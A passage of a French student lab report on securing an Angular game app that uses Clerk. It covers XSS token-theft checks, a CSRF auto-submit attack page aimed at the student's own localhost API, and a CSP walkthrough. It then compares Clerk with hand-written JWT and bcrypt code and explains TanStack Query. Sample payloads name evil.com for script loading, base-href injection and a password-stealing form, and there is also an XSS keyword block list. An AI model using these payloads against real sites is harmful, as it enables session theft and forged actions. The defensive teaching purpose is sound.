**Résultat observé :**
```
"__clerk_db_jwt_wlyxC0Tk=...; __session=eyJhbGc...; __client_uat=1777973779"
```

**Analyse :**
- ⚠️ Les cookies Clerk sont **accessibles en JavaScript** (pas HttpOnly pour tous)
- ✅ Le JWT expire après **1 minute** → Impact limité si volé
- ✅ Le vrai cookie de session (`__session`) contient le token complet mais expire rapidement

**Test 2 : Voler le JWT dans localStorage ?**

```javascript
localStorage.getItem('__clerk_db_jwt')
```

**Résultat :**
```
null  // ✅ Pas de JWT dans localStorage !
```

**Conclusion :**
- ✅ Clerk ne stocke **pas** le JWT dans `localStorage` (bonne pratique)
- ⚠️ Le cookie `__session` est accessible en JS mais expire rapidement
- ✅ Protection acceptable pour une SPA

---

### Mitigation XSS — 3 règles d'or

#### ✅ 1. Échapper tout contenu utilisateur rendu dans le DOM

**Code actuel (sécurisé) :**
```typescript
// ✅ Angular échappe automatiquement
template: `<div>{{ entry.username }}</div>`
```

**À ÉVITER :**
```typescript
// ❌ Bypasse l'escaping
template: `<div [innerHTML]="entry.username"></div>`
```

---

#### ✅ 2. Ne jamais `innerHTML` du contenu non-sanitizé

**Si vous devez absolument injecter du HTML :**
```typescript
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

getSafeHtml(html: string) {
  return this.sanitizer.sanitize(SecurityContext.HTML, html);
}

template: `<div [innerHTML]="getSafeHtml(userContent)"></div>`
```

---

#### ✅ 3. Validation côté serveur (ceinture + bretelles)

**Backend doit rejeter les payloads suspects :**
```javascript
// Backend : Valider le username
const username = req.body.username;
if (/<script|javascript:|onerror=|on\w+=/i.test(username)) {
  return res.status(400).json({ error: 'Username invalide' });
}
if (username.length > 50) {
  return res.status(400).json({ error: 'Username trop long' });
}
```

---

**Capture : Test XSS échoué**  
![XSS Failed](screenshots/leaderboard.png)

---

## 2️⃣ Cross-Site Request Forgery (CSRF)

### Contexte

**Définition :** Une requête forgée par un site malveillant pour exécuter une action non désirée sur un site où l'utilisateur est connecté.

**Exemple classique :**
```html
<!-- Site malveillant evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```

Si l'utilisateur est connecté à `bank.com`, le navigateur envoie automatiquement les cookies → Transfert d'argent non désiré !

---

### Expérience 3 — CSRF en pratique

**Fichier d'attaque :** [attack.html](attack.html)

```html
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>CSRF Attack Test</title>
</head>
<body>
  <h1>⚠️ Test d'attaque CSRF</h1>
  
  <form id="csrfForm" action="http://localhost:3000/api/games" method="POST">
    <input type="hidden" name="score" value="999999999">
    <input type="hidden" name="duration" value="300">
    <button type="submit">Tenter l'attaque CSRF</button>
  </form>
  
  <script>
    // Auto-submit après 2 secondes
    setTimeout(() => {
      document.getElementById('csrfForm').submit();
    }, 2000);
  </script>
</body>
</html>
```

**Procédure de test :**
1. ✅ Se connecter à Startup Tycoon sur `http://localhost:4200`
2. ✅ Ouvrir `attack.html` dans un nouvel onglet
3. ✅ Observer la requête dans DevTools → Network

**Résultat observé :**
```
❌ 401 Unauthorized
Reason: No Authorization header
```

**Capture : CSRF Attack Page**  
![CSRF Attack](screenshots/attack.png)

**Capture : CSRF Blocked**  
![CSRF Failed](screenshots/attack-fail.png)

---

### Pourquoi l'attaque échoue ?

#### 🛡️ 1. Pas de cookie automatique

Notre API utilise **`Authorization: Bearer <token>`** dans les headers, **pas les cookies**.

**Différence clé :**
- **Cookie** : Envoyé **automatiquement** par le navigateur à chaque requête
- **Authorization header** : Doit être ajouté **explicitement** via JavaScript

**Conséquence :**
Un formulaire HTML **ne peut pas** ajouter de header `Authorization` → Attaque impossible !

---

#### 🛡️ 2. CORS

Le backend rejette les requêtes cross-origin sans les bons headers.

**Configuration backend :**
```javascript
// Backend : CORS strict
app.use(cors({
  origin: ['http://localhost:4200', 'https://startup-tycoon.com'],
  credentials: true
}));
```

**Résultat :**
```
❌ CORS Error: No 'Access-Control-Allow-Origin' header
```

---

#### 🛡️ 3. Content-Type

Un formulaire HTML envoie `application/x-www-form-urlencoded`, mais notre API attend `application/json`.

**Backend :**
```javascript
app.use(express.json());  // Parse uniquement JSON
```

**Résultat :**
Le backend ignore les données du formulaire → Aucun traitement

---

#### 🛡️ 4. SameSite Cookies

Même si on utilisait des cookies, `SameSite=Lax` (Clerk) bloquerait les POST cross-site.

**Cookie Clerk :**
```
__session
  SameSite: Lax
```

**Protection :**
- `SameSite=Lax` : Cookie **jamais** envoyé en POST cross-site
- `SameSite=Strict` : Cookie **jamais** envoyé en cross-site (GET ou POST)

---

### Analyse comparative : Cookie vs Authorization Bearer

#### ⚠️ Scénario A : API basée sur cookies automatiques

```javascript
// Backend valide via cookie
app.post('/api/games', (req, res) => {
  const sessionId = req.cookies.__session;
  // ⚠️ Le navigateur envoie automatiquement le cookie
});
```

**Attaque possible :**
```html
<!-- evil.com -->
<form action="https://startup-tycoon.com/api/games" method="POST">
  <input name="score" value="999999999">
</form>
<script>document.forms[0].submit()</script>
```

→ ⚠️ **Attaque réussie** (si pas de SameSite ou CSRF token)

---

#### ✅ Scénario B : API basée sur Authorization Bearer (notre cas)

```javascript
// Backend valide via header
app.post('/api/games', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  // ✅ Impossible d'envoyer ce header via un formulaire HTML
});
```

**Attaque impossible :**
```html
<!-- evil.com -->
<form action="https://startup-tycoon.com/api/games" method="POST">
  <!-- ❌ Impossible d'ajouter un header Authorization -->
</form>
```

→ ✅ **Protection par design**

---

### Mitigation CSRF — 3 techniques

#### ✅ 1. SameSite Cookies

**Configuration :**
```javascript
res.cookie('sessionId', token, {
  sameSite: 'strict',  // ou 'lax'
  httpOnly: true,
  secure: true
});
```

**Protection :**
- `Strict` : Cookie **jamais** envoyé en cross-site
- `Lax` : Cookie envoyé uniquement en navigation GET (pas POST)

---

#### ✅ 2. Double-Submit Token

**Principe :**
1. Cookie contient un token aléatoire
2. Requête POST doit inclure le même token dans le body
3. Backend vérifie : `cookie.token === body.token`

**Code :**
```javascript
// Backend
const csrfToken = crypto.randomBytes(32).toString('hex');
res.cookie('csrf_token', csrfToken, { httpOnly: true });

// Frontend
fetch('/api/games', {
  method: 'POST',
  headers: { 'X-CSRF-Token': getCookie('csrf_token') }
});
```

---

#### ✅ 3. Authorization Header (notre choix)

**Protection native** :
- Header `Authorization: Bearer` ne peut **jamais** être envoyé automatiquement
- CORS bloque les requêtes cross-origin
- **Pas besoin de CSRF token**

---

**Conclusion :** Notre API est **protégée par design** grâce à l'architecture JWT + Authorization Header.

---

## 3️⃣ Content Security Policy (CSP)

### Contexte

**Définition :** Politique de sécurité qui définit les sources autorisées pour les scripts, styles, images, etc.

**Objectif :** Empêcher l'exécution de code JavaScript injecté (XSS), même si l'attaque réussit.

---

### Expérience 4 — CSP actuelle

**Fichier :** [src/index.html](src/index.html)

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://clerk.com https://*.clerk.accounts.dev;
  connect-src 'self' http://localhost:3000 ws://localhost:3000 https://clerk.com https://*.clerk.accounts.dev;
  img-src 'self' data: https://img.clerk.com;
  style-src 'self' 'unsafe-inline';
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
">
```

**Capture : CSP dans DevTools**  
![CSP Headers](screenshots/csp-headers.png)

---

### Analyse directive par directive

#### 🔒 `default-src 'self'`

**Effet :** Bloque toutes les ressources externes par défaut

**Autorisé :**
- ✅ `https://startup-tycoon.com/script.js`

**Bloqué :**
- ❌ `https://cdn.example.com/script.js`
- ❌ `https://fonts.googleapis.com`

---

#### 🔒 `script-src 'self' https://clerk.com https://*.clerk.accounts.dev`

**Effet :** JavaScript autorisé uniquement depuis :
- Domaine de l'app (`'self'`)
- Clerk API

**Bloqué :**
- ❌ Scripts inline : `<script>alert(1)</script>`
- ❌ Scripts externes malveillants : `<script src="https://evil.com/hack.js"></script>`
- ❌ `eval()`, `new Function()`

---

#### 🔒 `connect-src 'self' http://localhost:3000 ws://localhost:3000 ...`

**Effet :** Requêtes AJAX/WebSocket autorisées vers :
- Backend local (développement)
- Clerk API

**Pourquoi `ws://localhost:3000` ?**
→ Anticipation du mode multijoueur avec WebSocket (TP14)

---

#### 🔒 `img-src 'self' data: https://img.clerk.com`

**Effet :** Images autorisées depuis :
- Domaine de l'app
- Data URLs : `data:image/png;base64,...`
- CDN Clerk (avatars utilisateurs)

---

#### ⚠️ `style-src 'self' 'unsafe-inline'`

**Effet :** CSS autorisé depuis le domaine + styles inline `<style>`

**Pourquoi `'unsafe-inline'` ?**
→ Angular génère des styles scoped inline (compromis courant)

**Risque :**
Un attaquant XSS pourrait injecter :
```html
<style>body { display: none; }</style>
```

**Mitigation en production :**
- Utiliser des **nonces** ou **hashes** (complexe)
- Externaliser tous les styles

---

#### 🔒 `object-src 'none'`

**Effet :** Bloque `<object>`, `<embed>`, `<applet>`

**Protection :** Empêche l'exécution de Flash, Java, etc.

---

#### 🔒 `base-uri 'self'`

**Effet :** Bloque l'injection de `<base href="http://evil.com">`

**Attaque possible sans CSP :**
```html
<base href="http://evil.com/">
<script src="script.js"></script>
<!-- Charge http://evil.com/script.js au lieu de /script.js -->
```

---

#### 🔒 `form-action 'self'`

**Effet :** Formulaires ne peuvent soumettre que vers le même domaine

**Bloqué :**
```html
<form action="http://evil.com/steal">
  <input name="password">
</form>
```

---

#### 🔒 `frame-ancestors 'none'`

**Effet :** Interdit d'embarquer l'app dans une `<iframe>`

**Protection :** Clickjacking

**Bloqué :**
```html
<!-- Site malveillant -->
<iframe src="https://startup-tycoon.com"></iframe>
```

---

### Expérience 5 — Tester la CSP

#### Test 1 : Script inline

**Ajout temporaire dans `index.html` :**
```html
<script>alert('XSS')</script>
```

**Résultat attendu :**
```
❌ Refused to execute inline script because it violates the following
   Content Security Policy directive: "script-src 'self' https://clerk.com"
```

**Capture : CSP Désactivé - Script fonctionne**  
![CSP Inline Works](screenshots/csp-inline-works.png)

---

#### Test 2 : Script externe non autorisé

**Ajout temporaire :**
```html
<script src="https://evil.com/hack.js"></script>
```

**Résultat :**
```
❌ Refused to load the script 'https://evil.com/hack.js' because it
   violates the following CSP directive: "script-src 'self' ..."
```

---

#### Test 3 : Style inline malveillant

**Ajout temporaire :**
```html
<style>body { display: none; }</style>
```

**Résultat :**
```
✅ Autorisé (car 'unsafe-inline' dans style-src)
⚠️ Compromis nécessaire pour Angular
```

---

### Production : Header HTTP vs Meta Tag

#### Développement (meta tag)

**Avantages :**
- ✅ Simple à configurer
- ✅ Pas besoin de modifier le backend

**Inconvénients :**
- ❌ Peut être modifié par JS (moins sécurisé)
- ❌ Pas de support Report-Only

---

#### Production (header HTTP)

**Configuration backend (Express) :**
```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; ...");
  next();
});
```

**Avantages :**
- ✅ Plus difficile à contourner
- ✅ Support `Content-Security-Policy-Report-Only`
- ✅ Peut inclure des nonces dynamiques

---

### Mode Report-Only

**Principe :** Surveiller les violations sans bloquer

**Configuration :**
```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

**Workflow recommandé :**
1. Déployer en `Report-Only` → Collecter les violations pendant 1 semaine
2. Ajuster la policy selon les reports
3. Activer en mode strict (`Content-Security-Policy`)

---

### Conclusion CSP

**Impact sécurité :**
- ✅ Bloque 99% des XSS exploitables (même si injection réussie)
- ✅ Empêche l'exfiltration de données vers des domaines non autorisés
- ⚠️ `'unsafe-inline'` reste un trou → Passer aux nonces en production

**Limites :**
- Ne protège pas contre les XSS dans le contenu textuel (phishing)
- Ne remplace pas l'escaping et la validation

---

**Capture : CSP En production**  
_Voir captures précédentes pour tests avant/après_

---

**Fin du livrable Partie 4**

---
---

# 🔹 Partie 5 — Analyse critique finale

**Objectif :** Réflexion technique sur l'architecture, les choix technologiques et les leçons apprises.

---

## 1. Citez 3 choses que Clerk vous a économisées

### ✅ 1. Gestion des sessions et tokens

**Ce que Clerk fait :**
- Génération automatique des JWT avec expiration (1 minute)
- Refresh automatique des tokens (silencieux)
- Gestion du cycle de vie (login, logout, token refresh)
- Stockage sécurisé des credentials côté serveur

**Économie estimée :**
- **Code** : 200-300 lignes de backend
- **Sécurité** : Cryptographie RS256, salting, hashage
- **Temps** : 10-15h de développement + 5h de tests

**Ce qu'il aurait fallu implémenter :**
```javascript
// Backend from scratch
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// Hashage mot de passe
const hashedPassword = await bcrypt.hash(password, 12);

// Génération token
const token = jwt.sign(
  { userId: user.id, email: user.email },
  process.env.JWT_SECRET,
  { expiresIn: '15m', algorithm: 'RS256' }
);

// Refresh token
const refreshToken = crypto.randomBytes(32).toString('hex');
await db.refreshTokens.insert({ userId, token: refreshToken, expiresAt: Date.now() + 90 * 86400000 });

// Middleware validation
function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  jwt.verify(token, publicKey, (err, user) => {
    if (err) return res.sendStatus(401);
    req.user = user;
    next();
  });
}
```

---

### ✅ 2. OAuth & authentification sociale

**Ce que Clerk fait :**
- Intégrations Google, GitHub, Microsoft prêtes à l'emploi
- Gestion des flux OAuth 2.0 (redirect, callback, state, PKCE)
- Synchronisation des profils (email, avatar, nom)
- Gestion des scopes et permissions

**Économie estimée :**
- **Code** : 500-1000 lignes (gestion des 3 providers)
- **Configuration** : Création d'apps OAuth sur Google/GitHub/Microsoft
- **Temps** : 20-30h de développement + debugging OAuth

**Ce qu'il aurait fallu implémenter :**
```javascript
// OAuth Google from scratch
const { OAuth2Client } = require('google-auth-library');
const client = new OAuth2Client(CLIENT_ID, CLIENT_SECRET, REDIRECT_URI);

// Générer URL d'autorisation
const authUrl = client.generateAuthUrl({
  access_type: 'offline',
  scope: ['profile', 'email']
});

// Callback après autorisation
app.get('/auth/google/callback', async (req, res) => {
  const { code } = req.query;
  const { tokens } = await client.getToken(code);
  client.setCredentials(tokens);
  
  const ticket = await client.verifyIdToken({
    idToken: tokens.id_token,
    audience: CLIENT_ID
  });
  
  const payload = ticket.getPayload();
  // Créer/mettre à jour l'utilisateur en BDD
});

// Répéter pour GitHub, Microsoft...
```

---

### ✅ 3. UI d'authentification responsive et accessible

**Ce que Clerk fait :**
- Composants React/Vue/Angular pré-faits (SignIn, SignUp, UserButton)
- Gestion des erreurs (mot de passe oublié, email non vérifié)
- Responsive design + accessibilité (ARIA, keyboard navigation)
- Internationalisation (i18n)
- Thèmes personnalisables

**Économie estimée :**
- **Code** : 300-500 lignes de CSS/HTML/TypeScript
- **Tests** : Multi-navigateurs, multi-devices, accessibilité
- **Temps** : 15-20h de développement + 5h de tests

**Ce qu'il aurait fallu implémenter :**
```typescript
// Formulaire de login from scratch
@Component({
  template: `
    <form (ngSubmit)="onSubmit()">
      <label for="email">Email</label>
      <input 
        id="email" 
        [(ngModel)]="email" 
        type="email" 
        required
        aria-required="true"
        aria-describedby="email-error"
      >
      <div id="email-error" *ngIf="errors.email">{{ errors.email }}</div>
      
      <label for="password">Mot de passe</label>
      <input 
        id="password" 
        [(ngModel)]="password" 
        type="password" 
        required
        aria-required="true"
      >
      
      <button type="submit" [disabled]="loading">
        {{ loading ? 'Connexion...' : 'Se connecter' }}
      </button>
      
      <a href="/forgot-password">Mot de passe oublié ?</a>
    </form>
  `
})
// + Gestion des erreurs + validation + responsive + accessibilité...
```

---

**Total économisé : ~1500-2000 lignes de code + 50-70h de développement**

---

## 2. Citez 3 choses que vous **n'avez pas apprises** à cause de Clerk

### ❌ 1. Cryptographie et hashage de mots de passe

**Ce qu'on n'a pas appris :**
- Comment hasher un password (bcrypt, scrypt, Argon2)
- Salting et protection contre rainbow tables
- Gestion des secrets et clés de chiffrement (KMS, Vault)
- Rotation des clés
- Timing attacks et constant-time comparison

**Exemple de code qu'on n'a pas écrit :**
```javascript
const bcrypt = require('bcrypt');

// Hashage avec salt automatique
const saltRounds = 12;  // Coût CPU (2^12 itérations)
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);

// Vérification
const isValid = await bcrypt.compare(plainPassword, hashedPassword);

// ⚠️ Timing attack si mal implémenté :
// if (password === hashedPassword) ❌
// → Utiliser crypto.timingSafeEqual() ou bcrypt.compare()
```

**Concepts non explorés :**
- Rainbow tables et comment les salts les rendent inutiles
- PBKDF2, scrypt, Argon2 : différences et cas d'usage
- Coût CPU (salt rounds) : balance sécurité/performance

---

### ❌ 2. Architecture JWT from scratch

**Ce qu'on n'a pas appris :**
- Comment signer un JWT (HMAC vs RSA)
- Gestion des refresh tokens en BDD
- Rotation des clés et révocation de tokens
- Structure d'une table `refresh_tokens`
- Stratégies de renouvellement (sliding window, absolute expiration)

**Exemple de code qu'on n'a pas écrit :**
```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Génération d'un JWT
const accessToken = jwt.sign(
  { userId: user.id, email: user.email },
  process.env.JWT_SECRET,
  { expiresIn: '15m', algorithm: 'HS256' }
);

// Génération d'un refresh token
const refreshToken = crypto.randomBytes(32).toString('hex');

// Stockage en BDD
await db.refreshTokens.insert({
  userId: user.id,
  token: refreshToken,
  expiresAt: new Date(Date.now() + 90 * 86400000),  // 90 jours
  createdAt: new Date()
});

// Endpoint de refresh
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  const storedToken = await db.refreshTokens.findOne({ token: refreshToken });
  if (!storedToken || storedToken.expiresAt < new Date()) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
  
  const newAccessToken = jwt.sign({ userId: storedToken.userId }, JWT_SECRET, { expiresIn: '15m' });
  res.json({ accessToken: newAccessToken });
});

// Révocation d'un token
app.post('/auth/logout', async (req, res) => {
  await db.refreshTokens.delete({ token: req.body.refreshToken });
  res.sendStatus(204);
});
```

**Concepts non explorés :**
- Différence HMAC (HS256) vs RSA (RS256)
- Pourquoi RS256 est meilleur pour les microservices
- Comment gérer la révocation de tokens (liste noire vs expiration courte)

---

### ❌ 3. Gestion des sessions en base de données

**Ce qu'on n'a pas appris :**
- Table `sessions` avec user_id, token, expiry, ip, user_agent
- Cleanup automatique des sessions expirées (cron job)
- Scaling horizontal (Redis, session clustering)
- Stratégies de persistence (sticky sessions vs session store)

**Exemple de code qu'on n'a pas écrit :**
```javascript
// Schema MongoDB pour sessions
const sessionSchema = new Schema({
  userId: { type: ObjectId, ref: 'User', required: true },
  token: { type: String, required: true, unique: true },
  expiresAt: { type: Date, required: true },
  ipAddress: String,
  userAgent: String,
  lastActivity: { type: Date, default: Date.now }
});

// Index pour auto-cleanup
sessionSchema.index({ expiresAt: 1 }, { expireAfterSeconds: 0 });

// Création de session
async function createSession(userId, ipAddress, userAgent) {
  const token = crypto.randomBytes(32).toString('hex');
  await Session.create({
    userId,
    token,
    expiresAt: new Date(Date.now() + 7 * 86400000),  // 7 jours
    ipAddress,
    userAgent
  });
  return token;
}

// Validation de session
async function validateSession(token) {
  const session = await Session.findOne({ token });
  if (!session || session.expiresAt < new Date()) {
    return null;
  }
  
  // Mise à jour de la dernière activité
  session.lastActivity = new Date();
  await session.save();
  
  return session.userId;
}

// Cleanup automatique (cron job)
setInterval(async () => {
  await Session.deleteMany({ expiresAt: { $lt: new Date() } });
}, 3600000);  // Toutes les heures
```

**Concepts non explorés :**
- Redis vs MongoDB pour les sessions (performance)
- Sticky sessions (load balancer) vs session store partagé
- Sliding window (prolonger automatiquement la session)

---

**Conséquence globale :**
- ✅ Gain de temps énorme pour le TP
- ❌ Dépendance à un SaaS → Si Clerk ferme ou change de pricing, migration coûteuse
- ❌ Moins de compréhension "bas niveau" de l'authentification

---

## 3. Si vous deviez implémenter l'auth sans Clerk, quels seraient les 5 points critiques ?

### 1️⃣ Hashage sécurisé des mots de passe

**Exigences :**
```javascript
const bcrypt = require('bcrypt');
const saltRounds = 12;  // Minimum recommandé en 2026

// ✅ Lors de l'inscription
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
await db.users.insert({ email, password: hashedPassword });

// ✅ Lors de la connexion
const user = await db.users.findOne({ email });
const isValid = await bcrypt.compare(plainPassword, user.password);
if (!isValid) return res.status(401).json({ error: 'Invalid credentials' });
```

**Points critiques :**
- ❌ **Jamais** stocker en clair ou MD5/SHA1 (cassables en secondes)
- ✅ Utiliser bcrypt/scrypt/Argon2 avec salt automatique
- ✅ Coût CPU élevé (saltRounds ≥ 12) → Protection contre bruteforce
- ⚠️ Coût CPU élevé → **Rate limiting obligatoire** (5 tentatives max/15 min)

---

### 2️⃣ Génération et validation des JWT

**Exigences :**
```javascript
const jwt = require('jsonwebtoken');

// ✅ Secret long et aléatoire (256 bits minimum)
const JWT_SECRET = process.env.JWT_SECRET;  // Ex: openssl rand -base64 32

// ✅ Génération avec expiration courte
const token = jwt.sign(
  { userId: user.id, email: user.email },
  JWT_SECRET,
  { expiresIn: '15m', algorithm: 'HS256' }
);

// ✅ Validation
function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.sendStatus(401);
  
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);  // Token expiré ou invalide
    req.user = user;
    next();
  });
}
```

**Points critiques :**
- ✅ Secret **jamais** committé (`.env` + `.gitignore`)
- ✅ Expiration courte (5-15 min) pour limiter l'impact d'un vol
- ✅ Refresh token séparé (stocké en BDD, expiration longue)
- ✅ Algorithme sécurisé (HS256 ou RS256, **jamais `none`**)

---

### 3️⃣ Protection contre les attaques par force brute

**Exigences :**
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 tentatives max
  message: 'Trop de tentatives, réessayez dans 15 minutes',
  skipSuccessfulRequests: true  // Ne compte que les échecs
});

app.post('/auth/login', loginLimiter, loginHandler);
```

**Points critiques :**
- ✅ Rate limiting par IP
- ✅ Captcha après 3 échecs
- ✅ Blocage temporaire (exponential backoff : 1 min, 5 min, 15 min, 1h)
- ✅ Alertes admin si > 100 tentatives/heure (attaque en cours)

---

### 4️⃣ Gestion sécurisée des cookies de session

**Exigences :**
```javascript
res.cookie('sessionId', token, {
  httpOnly: true,        // ✅ Inaccessible en JavaScript (protection XSS)
  secure: true,          // ✅ HTTPS uniquement
  sameSite: 'strict',    // ✅ Protection CSRF
  maxAge: 7 * 24 * 3600 * 1000,  // 7 jours
  signed: true,          // ✅ Signature cryptographique
  domain: '.startup-tycoon.com'  // Sous-domaines autorisés
});
```

**Points critiques :**
- ✅ **HttpOnly** obligatoire (sinon XSS = game over)
- ✅ **Secure** en production (HTTPS)
- ✅ **SameSite=Strict** pour CSRF (ou Lax + CSRF token)
- ⚠️ Ne jamais stocker de données sensibles (password, carte bancaire)

---

### 5️⃣ Révocation de tokens (logout, compte supprimé)

**Exigences :**
```javascript
// Table en BDD
CREATE TABLE revoked_tokens (
  token_jti VARCHAR(255) PRIMARY KEY,
  revoked_at TIMESTAMP,
  expires_at TIMESTAMP
);

// Générer JWT avec JTI (JWT ID unique)
const token = jwt.sign(
  { userId: user.id, jti: crypto.randomUUID() },
  JWT_SECRET,
  { expiresIn: '15m' }
);

// Middleware de validation
async function validateToken(req, res, next) {
  const token = extractToken(req);
  const decoded = jwt.verify(token, JWT_SECRET);
  
  // Vérifier si révoqué
  const isRevoked = await db.revokedTokens.findOne({ token_jti: decoded.jti });
  if (isRevoked) return res.status(401).json({ error: 'Token révoqué' });
  
  req.user = decoded;
  next();
}

// Logout : révoquer le token
app.post('/auth/logout', async (req, res) => {
  const decoded = jwt.verify(req.token, JWT_SECRET);
  await db.revokedTokens.insert({
    token_jti: decoded.jti,
    revoked_at: new Date(),
    expires_at: new Date(decoded.exp * 1000)
  });
  res.sendStatus(204);
});

// Cleanup automatique (cron job)
setInterval(async () => {
  await db.revokedTokens.deleteMany({ expires_at: { $lt: new Date() } });
}, 3600000);
```

**Points critiques :**
- ✅ JTI (JWT ID) unique pour chaque token
- ✅ Révocation immédiate (logout, ban, suppression compte)
- ✅ Cleanup automatique des tokens expirés (éviter la croissance infinie)
- ⚠️ Alternative : Expiration courte + pas de révocation (trade-off)

---

**Bonus : Audit logging**
```javascript
await db.auditLogs.insert({
  userId: user.id,
  action: 'LOGIN',
  ipAddress: req.ip,
  userAgent: req.headers['user-agent'],
  timestamp: new Date()
});
```

---

## 4. Pourquoi TanStack Query n'est pas "un fetch plus pratique" ?

**Idée fausse :** "TanStack Query = fetch() avec du sucre syntaxique"

**Réalité :** TanStack Query est un **système de gestion d'état serveur** complet.

---

### Différences fondamentales

#### ❌ Fetch classique

```typescript
// Problème 1 : Pas de cache
useEffect(() => {
  fetch('/api/leaderboard').then(setData);
}, []);  // ❌ Refetch à chaque render, même si données identiques

// Problème 2 : Pas de déduplication
// Si 2 composants font le même fetch, 2 requêtes réseau

// Problème 3 : Gestion manuelle des états
const [data, setData] = useState(null);
const [loading, setLoading] = useState(true);
const [error, setError] = useState(null);

// Problème 4 : Pas de refetch automatique
// Si un autre joueur ajoute un score, on ne le verra jamais
```

---

#### ✅ TanStack Query

```typescript
const { data, isLoading, error, refetch } = useQuery({
  queryKey: ['leaderboard'],
  queryFn: fetchLeaderboard,
  staleTime: 20_000,         // ✅ Cache intelligent
  refetchInterval: 30_000,   // ✅ Refetch automatique
  refetchOnWindowFocus: true // ✅ Refetch au retour sur l'onglet
});

// ✅ Cache partagé entre tous les composants
// ✅ Déduplication automatique
// ✅ États gérés automatiquement
// ✅ Synchronisation en temps réel
```

---

### 1. Cache intelligent

**Sans TanStack Query :**
```typescript
// User journey :
// 1. Visite /leaderboard → fetch ⏳
// 2. Navigue vers /game
// 3. Revient sur /leaderboard → fetch again ⏳ (données identiques !)
```

**Avec TanStack Query :**
```typescript
// 1. Visite /leaderboard → fetch ⏳
// 2. Navigue vers /game
// 3. Revient sur /leaderboard → cache instantané ✅
//    (si < staleTime, sinon refetch en background)

**Ce que TanStack Query fait :**
```typescript
useQuery({
  queryKey: ['leaderboard'],
  queryFn: fetchLeaderboard,
  staleTime: 10_000,  // Données considérées fraîches pendant 10s
  refetchInterval: 30_000,  // Refetch automatique toutes les 30s
  refetchOnWindowFocus: true,  // Refetch quand l'utilisateur revient sur l'onglet
  refetchOnReconnect: true,  // Refetch après une déconnexion réseau
});
```

**Résultat :**
- Les données sont **automatiquement mises à jour** sans intervention de l'utilisateur
- Si Bob laisse l'onglet ouvert, il verra le score d'Alice apparaître dans les 30 secondes
- Si Bob revient sur l'onglet après avoir consulté ses emails, refetch automatique

**Gestion de la fraîcheur :**
```
staleTime = 10s → Pendant 10s, les données sont "fraîches", pas de refetch
Après 10s → Données "stale" (obsolètes), refetch au prochain événement
  - refetchOnWindowFocus
  - refetchOnMount
  - refetchInterval
```

---

#### **3. Invalidation de cache et synchronisation entre composants**

**Problème :**
Quand je soumets un nouveau score :
1. Je `POST /api/games` → succès
2. La page `/stats` affiche toujours l'ancien historique (pas de nouveau score)
3. La page `/leaderboard` affiche toujours l'ancien top 20 (pas de mise à jour)

**Comment résoudre ça avec `signal + fetch` ?**
- ⚠️ Option 1 : Faire un nouveau `fetch` manuellement après chaque mutation → verbeux, facile d'oublier
- ⚠️ Option 2 : Event bus / Subject RxJS pour notifier les autres composants → complexe, boilerplate énorme
- ⚠️ Option 3 : Recharger la page (`window.location.reload()`) → UX horrible

**Ce que TanStack Query fait :**
```typescript
const submitGameMutation = useMutation({
  mutationFn: (gameData) => fetch('/api/games', { 
    method: 'POST', 
    body: JSON.stringify(gameData),
    headers: { 'Content-Type': 'application/json' }
  }),
  onSuccess: () => {
    // Invalider le cache de toutes les queries concernées
    queryClient.invalidateQueries({ queryKey: ['leaderboard'] });
    queryClient.invalidateQueries({ queryKey: ['games', 'me'] });
  },
});
```

**Résultat :**
- **Tous les composants qui affichent le leaderboard ou l'historique sont automatiquement refetch** après la mutation
- Synchronisation zéro effort
- UI toujours à jour

**Workflow :**
```
1. User finit une partie
2. submitGameMutation.mutate({ score: 50000, duration: 300, clicks: 1200 })
3. POST /api/games → succès
4. onSuccess() → invalidateQueries(['leaderboard']) → tous les useQuery(['leaderboard']) refetch
5. onSuccess() → invalidateQueries(['games', 'me']) → tous les useQuery(['games', 'me']) refetch
6. UI mise à jour automatiquement dans tous les composants
```

---

### 📊 Résumé : Signal vs TanStack Query

| Critère | `signal + fetch` | TanStack Query |
|---------|------------------|----------------|
| **Cache** | ❌ Aucun | ✅ Automatique (par `queryKey`) |
| **Déduplication** | ❌ Requêtes multiples | ✅ 1 seule requête par `queryKey` |
| **Refetch automatique** | ❌ Manuel uniquement | ✅ `staleTime`, `refetchInterval`, `refetchOnWindowFocus` |
| **Loading state** | ⚠️ Manuel (`loading` signal) | ✅ `isLoading`, `isFetching` |
| **Error state** | ⚠️ Manuel (`error` signal) | ✅ `isError`, `error` |
| **Retry** | ❌ Aucun | ✅ Automatique (configurable, 3 tentatives par défaut) |
| **Invalidation** | ❌ Aucune coordination | ✅ `invalidateQueries()` |
| **Optimistic updates** | ❌ Pas de support | ✅ `onMutate` avec rollback automatique |
| **DevTools** | ❌ Aucun | ✅ React Query DevTools / TanStack Query DevTools |
| **Boilerplate** | ⚠️ Répétitif (loading, error, try/catch partout) | ✅ Minimal (déclaratif) |
| **Coordination multi-composants** | ❌ Event bus manuel | ✅ Cache partagé automatique |
| **Gestion de la fraîcheur** | ❌ Données figées | ✅ Staleness configurable |
| **Background refetch** | ❌ Impossible | ✅ Automatique |

---

### 🎯 Conclusion

**TanStack Query n'est pas "un fetch plus pratique".**

